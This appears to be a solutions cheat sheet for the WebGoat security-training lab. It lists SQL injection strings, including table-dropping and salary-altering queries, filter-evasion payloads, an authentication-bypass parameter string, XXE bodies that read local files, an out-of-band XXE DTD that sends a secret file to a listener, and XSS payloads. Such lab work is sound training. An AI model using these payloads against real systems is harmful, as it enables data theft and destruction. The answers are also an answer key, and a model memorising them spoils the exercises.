To start:

docker pull webgoat/webgoat-8.0
(docker pull webgoat/goatandwolf) 

docker run -p 127.0.0.1:8080:8080 -p 127.0.0.1:9090:9090 -e TZ=Europe/Amsterdam
webgoat/goatandwolf

docker run -p 8080:4444 -t webgoat/webgoat-8.0

A1:

Sql injection intro:

2. SELECT department FROM employees WHERE first_name='Bob'

3. UPDATE employees SET department='Sales' WHERE first_name='Tobi'

4. ALTER TABLE employees ADD phone varchar(20)

5. GRANT select on grant_rights to unauthorized_user

9. ' + or + '1'='1

10. Login_count: 0
      User_Id: 0 OR 1=1

11. Employee Name: A
Authentication TAN: ' OR '1' = '1

12. Employee Name: A
Authentication TAN: '; UPDATE employees SET salary=99999 WHERE first_name='John

13. Action contains: %'; DROP TABLE access_log;--


Sql injection advanced

3. 
Name: '; SELECT * FROM user_system_data;--
Password: passW0rD

5.Open register and fill some random details for the name tom.
Now login using:
Name - tom
Password - thisisasecretfortomonly

6.
4-3-2-3-4

Sql mitigation 

5.
Fill in the blanks with the words below in order: 
getConnection, PreparedStatement, prepareStatement, ?, ?, setString, setString.



6.

try {  
     Connection conn = DriverManager.getConnection(DBURL, DBUSER, DBPW);  
     PreparedStatement ps = conn.prepareStatement("SELECT * FROM users WHERE name = ?");  
     ps.setString(1, "Admin");  
     ps.executeUpdate();  
} catch (Exception e) {  
     System.out.println("Oops. Something went wrong!");  
}


9.
a';/**/select/**/*/**/from/**/user_system_data;--


10.
a';/**/seselectlect/**/*/**/frfromom/**/user_system_data;--


12.
104.130.219.202


A2 

Authentication Bypass:

Submit without parameters, check the user ID, edit and resend and paste this.

secQuestion2=&secQuestion3=&jsEnabled=1&verifyMethod=SEC_QUESTIONS&userId=12309746


A3 

Sensitive data exposure:
Locate the query to start.mc in the Network tab and click on Parameters.
Notice the parameters {"username":"CaptainJack","password":"BlackPearl"}


A4 XML entities:

4. 
Submit a comment and Locate the query to simple in the Network tab and click on Edit    and Resend.
Edit the body with:

 <?xml version="1.0"?><!DOCTYPE comment [<!ENTITY xxe SYSTEM "file:///">]><comment><text>&xxe;</text></comment>

7.
Post a comment and Locate the query to content-type in the Network tab and click on Edit and Resend.
Edit the body with:

 <?xml version="1.0"?><!DOCTYPE comment [<!ENTITY xxe SYSTEM "file:///">]><comment><text>&xxe;</text></comment>

 and edit the header Content-Type: application/json with Content-Type: application/xml





11.

attack.dtd:

<?xml version="1.0" encoding="UTF-8"?>
<!ENTITY % all "<!ENTITY send SYSTEM 'http://0.0.0.0:9090/landing?%file;' >" >%all;

Request body:

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE xxe [
<!ENTITY % file SYSTEM "file:///home/webgoat/.webgoat-8.2.2//XXE/secret.txt" >
<!ENTITY % dtd SYSTEM "http://0.0.0.0:9090/files/rathish/attack2.dtd" >
%dtd;]>
<comment>
<text>test&send;</text>
</comment>

A7 Cross site scripting

2. Yes

7.  <script>alert()</script>

10.  Locate the goatApp/View/GoatRouter.js file and open it.
Look for routes to find 'test/:param': 'testRoute'.
The answer is start.mvc#test/
Debugger -> thread

11.
127.0.0.1:8080/WebGoat/start.mvc#test/<script>webgoat.customjs.phoneHome();

12.
4,3,1,2,4
